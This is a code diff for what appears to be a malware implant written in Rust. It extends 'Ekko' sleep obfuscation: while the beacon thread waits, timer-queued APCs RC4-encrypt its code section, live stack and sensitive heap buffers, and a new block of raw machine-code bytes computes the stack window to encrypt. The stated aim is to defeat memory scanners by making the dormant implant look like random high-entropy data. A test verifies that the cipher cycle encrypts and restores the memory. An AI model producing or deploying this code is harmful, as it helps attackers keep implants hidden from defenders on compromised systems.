@@ -1,13 +1,25 @@
 //! Sleep obfuscation (ABR-T006), waitable-timer variant of the Ekko family.
 //!
-//! While the implant thread sits in an alertable wait, five APCs queued via
-//! `SetWaitableTimer` fire in FIFO order on that same thread: (1) flip the
-//! executable section RW, (2) RC4 it in place through advapi32's
-//! `SystemFunction032`, then after the sleep delay (3) decrypt it, (4)
-//! restore RX and (5) wake the thread. Argument thunks live in a private
-//! allocation outside the encrypted region, so no implant code executes
-//! while the image is scrambled. The dead stack below RSP is erased before
-//! sleeping to strip leftovers such as task command strings.
+//! While the implant thread sits in an alertable wait, queued APCs fire in
+//! FIFO order on that same thread: (1) flip the executable section RW,
+//! (2) RC4 it in place through advapi32's `SystemFunction032`, then after
+//! the sleep delay (3) decrypt it, (4) restore RX and (5) wake the thread.
+//! Argument thunks live in a private allocation outside the encrypted
+//! region, so no implant code executes while the image is scrambled. The
+//! dead stack below RSP is erased before sleeping to strip leftovers such
+//! as task command strings.
+//!
+//! Sleep 2.0 extends the same cycle to the LIVE part of the stack and to
+//! the registered sensitive heap buffers: a prefill stub captures, from
+//! inside its own APC delivery, the upper bound of the stack region that
+//! is inert while the thread waits (everything above the APC dispatcher's
+//! frames belongs to the beacon loop — tokens, session keys, command
+//! buffers), and a second RC4 pair scrambles that region for the sleep
+//! window. The captured bound is saved in the arena so the decrypt stage
+//! covers the exact same bytes; the heap regions are ciphered
+//! synchronously around the timer arming (they are data, the ciphering
+//! code can stay on the stack). A memory-scanner view of the dormant
+//! thread is now high-entropy in both the image and the live stack.
 
 use std::ffi::c_void;
 use std::time::Duration;
@@ -22,20 +34,31 @@ const WAIT_LOOP_LEN: usize = 0x30;
 /// The dormant-parking variant needs room for its config slot (u64 at
 /// offset 0x48); the code region is sized for the larger blob either way.
 const WAIT_LOOP_SPOOFED_LEN: usize = 0x50;
-const CODE_LEN: usize = WAIT_LOOP_OFFSET + WAIT_LOOP_SPOOFED_LEN;
+/// Sleep 2.0 prefill stub: computes the stack cipher window from inside
+/// the APC delivery (see STACK_PREFILL below).
+const STACK_PREFILL_OFFSET: usize = 0x90;
+const STACK_PREFILL_LEN: usize = 0x40;
+const CODE_LEN: usize = STACK_PREFILL_OFFSET + STACK_PREFILL_LEN;
 /// Where the ABR-T008 metadata sits inside the code page — clear of the
 /// routine bodies (which end at CODE_LEN); the allocation commits whole
 /// pages and RVAs resolve against the page base, like .pdata in a PE.
 const UNWIND_META_OFFSET: usize = 0x200;
 const ARGS_LEN: usize = 0x30;
-const AUX_LEN: usize = 64;
+/// Aux block: text-cipher key/USTRINGs/protect-out (64) + stack-cipher
+/// key/USTRING/saved-bound (64).
+const AUX_LEN: usize = 128;
 /// ABR-T013: space inside the arena for the synthetic dormant stack —
 /// slack for kernelbase internals and APC completion routines below,
 /// the T010 anchor chain (park template) at PARK_CHAIN_OFFSET.
 const PARK_LEN: usize = 0x1800;
 const PARK_CHAIN_OFFSET: usize = 0x1008; // ≡ 8 mod 16 (call-entry rsp)
-const STAGES: usize = 5;
+/// Stage count: 7 thunk/prefill APCs + the SetEvent wake.
+const STAGES: usize = 8;
 const STAGE_GAP_MS: u32 = 50;
+/// Clearance the prefill leaves above its own APC delivery: the cipher
+/// stages and the kernel APC dispatcher build their frames below the
+/// captured bound; two pages cover the observed depths comfortably.
+const STACK_CIPHER_CLEARANCE: usize = 0x800;
 
 /// `mov rax,[rcx+0x20]; mov r9,[rcx+0x18]; mov r8,[rcx+0x10]; mov rdx,[rcx+0x08];
 ///  mov rcx,[rcx]; sub rsp,0x28; call rax; add rsp,0x28; ret`
@@ -101,6 +124,48 @@ struct Ustring {
     buffer: usize,
 }
 
+/// Sleep 2.0 prefill stub — runs as an APC completion routine with the
+/// stack-cipher USTRING block in rcx. It derives, from its own delivery,
+/// the upper bound of the stack that is inert for the rest of the sleep:
+///
+/// ```text
+/// 00: mov rdx, gs:[8]       ; TEB StackBase (top of the stack)
+/// 03: mov rax, rsp
+/// 06: add rax, CLEARANCE    ; above this APC's own frames (dispatcher,
+///                           ; trampoline, SystemFunction032 internals)
+/// 0C: and rax, -16
+/// 12: sub rdx, rax          ; length = StackBase - from
+/// 15: mov [rcx+8], rax      ; USTRING.buffer = from
+/// 19: mov [rcx], edx        ; USTRING.length
+/// 1B: mov [rcx+4], edx      ; USTRING.maximum_length
+/// 1E: mov [rcx+0x18], rax   ; saved bound — the decrypt stage reads the
+///                           ; exact same window
+/// 22: ret
+/// ```
+///
+/// The same RC4 key pairs encrypt (t=+150ms) and decrypt (t=delay+150ms)
+/// that window; both stages run as APCs at the same stack depth, so their
+/// own frames stay below the saved bound. Leaf routine, no prologue.
+#[rustfmt::skip]
+const STACK_PREFILL: [u8; STACK_PREFILL_LEN] = [
+    0x65, 0x48, 0x8B, 0x14, 0x25, 0x08, 0x00, 0x00, 0x00, // mov rdx, gs:[8]
+    0x48, 0x89, 0xE0,                                     // mov rax, rsp
+    0x48, 0x05,                                            // add rax, <CLEARANCE imm32>
+    (STACK_CIPHER_CLEARANCE & 0xFF) as u8,
+    ((STACK_CIPHER_CLEARANCE >> 8) & 0xFF) as u8,
+    ((STACK_CIPHER_CLEARANCE >> 16) & 0xFF) as u8,
+    ((STACK_CIPHER_CLEARANCE >> 24) & 0xFF) as u8,
+    0x48, 0x25, 0xF0, 0xFF, 0xFF, 0xFF,                   // and rax, -16
+    0x48, 0x29, 0xC2,                                     // sub rdx, rax
+    0x48, 0x89, 0x41, 0x08,                               // mov [rcx+8], rax
+    0x89, 0x11,                                           // mov [rcx], edx
+    0x89, 0x51, 0x04,                                     // mov [rcx+4], edx
+    0x48, 0x89, 0x41, 0x18,                               // mov [rcx+0x18], rax
+    0xC3,                                                  // ret
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // pad (11)
+    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, // pad (12)
+];
+
 type CreateEventFn = unsafe extern "system" fn(*mut c_void, i32, i32, *const u16) -> *mut c_void;
 type CreateWaitableTimerFn = unsafe extern "system" fn(*mut c_void, i32, *const u16) -> *mut c_void;
 type SetWaitableTimerFn =
@@ -116,6 +181,8 @@ pub struct EkkoSleep {
     system_function032: usize,
     thunk: usize,
     wait_loop: usize,
+    /// Sleep 2.0 prefill stub address (inside the code page).
+    prefill: usize,
     arena: usize,
     /// Whether the wait loop parks on the synthetic stack (ABR-T013 —
     /// WIP, disabled pending the fast-kill investigation).
@@ -175,7 +242,7 @@ impl EkkoSleep {
         // wait enters with call-convention alignment). Allocated before
         // the code page because the spoofed loop's cfg slot must point
         // at it.
-        let arena = unsafe { syscalls::alloc_rw(3 * ARGS_LEN + AUX_LEN + PARK_LEN) }
+        let arena = unsafe { syscalls::alloc_rw(7 * ARGS_LEN + AUX_LEN + PARK_LEN) }
             .ok_or_else(|| "arena allocation failed".to_string())?;
         let park_chain = arena + 3 * ARGS_LEN + AUX_LEN + PARK_CHAIN_OFFSET;
 
@@ -214,6 +281,10 @@ impl EkkoSleep {
             let wait_loop_dst = (code_page + WAIT_LOOP_OFFSET) as *mut u8;
             for (index, byte) in wait_blob.iter().enumerate() {
                 unsafe { wait_loop_dst.add(index).write_volatile(*byte) };
+            }
+            let prefill_dst = (code_page + STACK_PREFILL_OFFSET) as *mut u8;
+            for (index, byte) in STACK_PREFILL.iter().enumerate() {
+                unsafe { prefill_dst.add(index).write_volatile(*byte) };
             }
             if let Some(template) = park_template {
                 // Stage the anchor chain and patch the park_chain
@@ -262,6 +333,13 @@ impl EkkoSleep {
                             unwind::Code(9, unwind::UWOP_ALLOC_SMALL, 4),
                         ],
                     },
+                    // Sleep 2.0 prefill: leaf routine, empty unwind program.
+                    unwind::Routine {
+                        offset: STACK_PREFILL_OFFSET,
+                        len: STACK_PREFILL_LEN,
+                        prolog_end: 0,
+                        prolog: &[],
+                    },
                 ],
                 UNWIND_META_OFFSET,
             )?;
@@ -288,6 +366,7 @@ impl EkkoSleep {
             system_function032,
             thunk: code_page,
             wait_loop: code_page + WAIT_LOOP_OFFSET,
+            prefill: code_page + STACK_PREFILL_OFFSET,
             arena,
             spoofed_park,
             _unwind: unwind_table,
@@ -297,35 +376,89 @@ impl EkkoSleep {
         })
     }
 
-    /// Sleeps for `duration` with the executable section encrypted.
+    /// Sleeps for `duration` with the executable section encrypted, the
+    /// live stack above the APC delivery scrambled, and the registered
+    /// sensitive heap buffers ciphered (Sleep 2.0).
     pub fn sleep(&self, duration: Duration) -> Result<(), String> {
         let (text_base, text_len) = self.text;
-        let max_delay = u32::MAX - STAGE_GAP_MS * 3;
+        let max_delay = u32::MAX - STAGE_GAP_MS * 6;
         let delay = duration.as_millis().min(max_delay as u128) as u32;
         let before = hash_region(text_base, text_len);
 
         // Everything the timer callbacks dereference must live OUTSIDE the
         // sleeping thread's stack: in optimized builds the compiler is free
         // to reuse the slots of locals that appear dead (the callbacks'
-        // writes happen kernel-side and are invisible to it). The arena tail
-        // holds the key, both USTRINGs and the old-protection out-param.
-        let aux = self.arena + 3 * ARGS_LEN;
+        // writes happen kernel-side and are invisible to it). The aux tail
+        // holds the keys, the USTRINGs, the old-protection out-param and
+        // the stack-cipher bound slot.
+        let aux = self.arena + 7 * ARGS_LEN;
         let (key_at, key_ustr_at, data_ustr_at, protect_old_at) =
             (aux, aux + 16, aux + 32, aux + 48);
+        // Sleep 2.0 block: stack-cipher key + USTRINGs; the stack USTRING's
+        // buffer/length stay zero until the prefill APC fills them.
+        let (skey_at, skey_ustr_at, stack_ustr_at) = (aux + 64, aux + 80, aux + 96);
         unsafe {
             for offset in 0..16usize {
                 ((key_at + offset) as *mut u8).write_volatile(rand::random::<u8>());
+                ((skey_at + offset) as *mut u8).write_volatile(rand::random::<u8>());
             }
             let key_ustr = key_ustr_at as *mut Ustring;
             (*key_ustr).length = 16;
             (*key_ustr).maximum_length = 16;
             (*key_ustr).buffer = key_at;
+            let skey_ustr = skey_ustr_at as *mut Ustring;
+            (*skey_ustr).length = 16;
+            (*skey_ustr).maximum_length = 16;
+            (*skey_ustr).buffer = skey_at;
+            let stack_ustr = stack_ustr_at as *mut Ustring;
+            (*stack_ustr).length = 0;
+            (*stack_ustr).maximum_length = 0;
+            (*stack_ustr).buffer = 0;
             let data_ustr = data_ustr_at as *mut Ustring;
             (*data_ustr).length = text_len as u32;
             (*data_ustr).maximum_length = text_len as u32;
             (*data_ustr).buffer = text_base;
             (protect_old_at as *mut u32).write_volatile(0);
         }
+
+        // Registered heap buffers go under a synchronous RC4 pass before
+        // any timer is armed — they are data, so the ciphering code may
+        // live on the (itself soon-encrypted) stack; the same key locals
+        // come back bit-for-bit with the stack decrypt stage.
+        let heap = super::sensitive_regions();
+        let mut heap_key = [0u8; 16];
+        for byte in heap_key.iter_mut() {
+            *byte = rand::random();
+        }
+        if !heap.is_empty() {
+            let rc4: unsafe extern "system" fn(usize, usize) -> i32 =
+                unsafe { std::mem::transmute(self.system_function032) };
+            let mut hk = Ustring {
+                length: 16,
+                maximum_length: 16,
+                buffer: heap_key.as_ptr() as usize,
+            };
+            for &(ptr, len) in &heap {
+                if ptr == 0 || len == 0 {
+                    continue;
+                }
+                let mut data = Ustring {
+                    length: len as u32,
+                    maximum_length: len as u32,
+                    buffer: ptr,
+                };
+                let status = unsafe {
+                    rc4(
+                        &mut hk as *mut Ustring as usize,
+                        &mut data as *mut Ustring as usize,
+                    )
+                };
+                if status != 0 {
+                    return Err(format!("heap cipher failed ({status:#x})"));
+                }
+            }
+        }
+
         unsafe {
             let mut args = Args { base: self.arena };
             args.write(
@@ -344,6 +477,18 @@ impl EkkoSleep {
             );
             args.write(
                 2,
+                [stack_ustr_at, skey_ustr_at, 0, 0, self.system_function032],
+            );
+            args.write(
+                3,
+                [stack_ustr_at, skey_ustr_at, 0, 0, self.system_function032],
+            );
+            args.write(
+                4,
+                [data_ustr_at, key_ustr_at, 0, 0, self.system_function032],
+            );
+            args.write(
+                5,
                 [
                     text_base,
                     text_len,
@@ -354,23 +499,42 @@ impl EkkoSleep {
             );
         }
 
-        // APC stages in FIFO order: protect RW -> encrypt -> [delay]
-        // decrypt -> protect RX -> wake. Completion routines only fire on
-        // the thread in an alertable wait, so nothing runs while our thread
-        // is still queueing.
+        // APC stages in FIFO order. Completion routines only fire on the
+        // thread in an alertable wait, so nothing runs while our thread is
+        // still queueing. Timeline:
+        //   t0            flip .text RW
+        //   +1 gap        RC4 .text (encrypt)
+        //   +2 gaps       prefill: derive the stack window from this APC
+        //   +3 gaps       RC4 the live stack (encrypt)
+        //   [delay]
+        //   delay+2 gaps  RC4 the live stack back (same saved window/key)
+        //   delay+3 gaps  RC4 .text back
+        //   delay+4 gaps  flip .text RX
+        //   delay+5 gaps  SetEvent — wake only after everything is restored
         let stages: [(usize, usize, u32); STAGES] = [
             (self.thunk, self.arena, 0),
             (self.thunk, self.arena + ARGS_LEN, STAGE_GAP_MS),
-            (self.thunk, self.arena + ARGS_LEN, delay + STAGE_GAP_MS),
+            (self.prefill, stack_ustr_at, STAGE_GAP_MS * 2),
+            (self.thunk, self.arena + 2 * ARGS_LEN, STAGE_GAP_MS * 3),
             (
                 self.thunk,
-                self.arena + 2 * ARGS_LEN,
+                self.arena + 3 * ARGS_LEN,
                 delay + STAGE_GAP_MS * 2,
+            ),
+            (
+                self.thunk,
+                self.arena + 4 * ARGS_LEN,
+                delay + STAGE_GAP_MS * 3,
+            ),
+            (
+                self.thunk,
+                self.arena + 5 * ARGS_LEN,
+                delay + STAGE_GAP_MS * 4,
             ),
             (
                 self.set_event,
                 self.event as usize,
-                delay + STAGE_GAP_MS * 3,
+                delay + STAGE_GAP_MS * 5,
             ),
         ];
         for (index, &(callback, ctx, due)) in stages.iter().enumerate() {
@@ -397,6 +561,37 @@ impl EkkoSleep {
         }
         if hash_region(text_base, text_len) != before {
             return Err("executable section changed across sleep".into());
+        }
+        // Restore the heap buffers with the same key (RC4 re-init): the
+        // key locals were themselves encrypted with the stack and came
+        // back with the decrypt stage above.
+        if !heap.is_empty() {
+            let rc4: unsafe extern "system" fn(usize, usize) -> i32 =
+                unsafe { std::mem::transmute(self.system_function032) };
+            let mut hk = Ustring {
+                length: 16,
+                maximum_length: 16,
+                buffer: heap_key.as_ptr() as usize,
+            };
+            for &(ptr, len) in &heap {
+                if ptr == 0 || len == 0 {
+                    continue;
+                }
+                let mut data = Ustring {
+                    length: len as u32,
+                    maximum_length: len as u32,
+                    buffer: ptr,
+                };
+                let status = unsafe {
+                    rc4(
+                        &mut hk as *mut Ustring as usize,
+                        &mut data as *mut Ustring as usize,
+                    )
+                };
+                if status != 0 {
+                    return Err(format!("heap restore failed ({status:#x})"));
+                }
+            }
         }
         Ok(())
     }
@@ -883,6 +1078,82 @@ mod tests {
             before,
             "private buffer not restored bit-for-bit"
         );
+    }
+
+    /// Sleep 2.0: proves the LIVE stack above the APC delivery is
+    /// scrambled mid-sleep and restored bit-for-bit on wake. A sibling
+    /// thread sleeps with a recognizable marker in its caller frame —
+    /// pushed more than STACK_CIPHER_CLEARANCE above the sleep entry by
+    /// a frame-sized pad, so the geometry is deterministic — while this
+    /// thread samples the marker from outside. Mid-sleep it must read
+    /// as ciphertext, after the cycle it must be exactly the plaintext
+    /// again.
+    #[test]
+    #[ignore = "real stack-cipher cycle on a sibling thread; serial only"]
+    fn sleep2_scrambles_live_stack_and_restores() {
+        use std::sync::atomic::{AtomicUsize, Ordering};
+        use std::sync::Arc;
+
+        const LEN: usize = 0x2000;
+        let buffer = unsafe { syscalls::alloc_rw(LEN) }.expect("private buffer");
+        unsafe {
+            for offset in 0..LEN {
+                ((buffer + offset) as *mut u8).write_volatile((offset as u8) ^ 0x5A);
+            }
+            syscalls::protect(buffer, LEN, PAGE_EXECUTE_READ as usize).expect("buffer to RX");
+        }
+        let ekko = unsafe { EkkoSleep::with_text((buffer, LEN)) }.expect("ekko setup");
+
+        let marker_at = Arc::new(AtomicUsize::new(0));
+        let marker_copy = marker_at.clone();
+        // EkkoSleep carries raw handles (not Send); the one-cycle-at-a-time
+        // contract is per-thread and this sleeper owns it exclusively.
+        struct SendSleep(EkkoSleep);
+        unsafe impl Send for SendSleep {}
+        let ekko = SendSleep(ekko);
+        let sleeper = std::thread::spawn(move || {
+            // Bind the wrapper itself first: edition-2021 closures capture
+            // precise paths, and `ekko.0` would capture the raw-pointer
+            // field directly, bypassing the Send impl above.
+            let wrapper = ekko;
+            let ekko = wrapper.0;
+            // The pad pushes the marker (and everything the sleeper's
+            // caller frames hold) safely above the prefill's clearance.
+            #[inline(never)]
+            fn deep(ekko: &EkkoSleep, marker_at: &AtomicUsize) {
+                let pad = [0x11u8; STACK_CIPHER_CLEARANCE + 0x200];
+                std::hint::black_box(&pad);
+                let marker = [0xA5u8; 64];
+                marker_at.store(&marker as *const [u8; 64] as usize, Ordering::SeqCst);
+                std::sync::atomic::fence(Ordering::SeqCst);
+                ekko.sleep(Duration::from_millis(1500))
+                    .expect("sleep cycle");
+                assert_eq!(marker, [0xA5u8; 64], "marker not restored after the cycle");
+            }
+            deep(&ekko, &marker_copy);
+        });
+
+        // Wait until the sleeper publishes, then sample inside the sleep
+        // window (well after the +150ms stack-encrypt stage).
+        let deadline = std::time::Instant::now() + Duration::from_secs(2);
+        let addr = loop {
+            let addr = marker_at.load(Ordering::SeqCst);
+            if addr != 0 {
+                break addr;
+            }
+            assert!(
+                std::time::Instant::now() < deadline,
+                "sleeper never published"
+            );
+            std::thread::sleep(Duration::from_millis(10));
+        };
+        std::thread::sleep(Duration::from_millis(700));
+        let mid: [u8; 64] = unsafe { std::ptr::read_volatile(addr as *const [u8; 64]) };
+        assert_ne!(
+            mid, [0xA5u8; 64],
+            "marker still plaintext mid-sleep — stack cipher missed the caller frames"
+        );
+        sleeper.join().expect("sleeper panicked");
     }
 
     /// Integrated long-run validation over a private buffer: repeated full
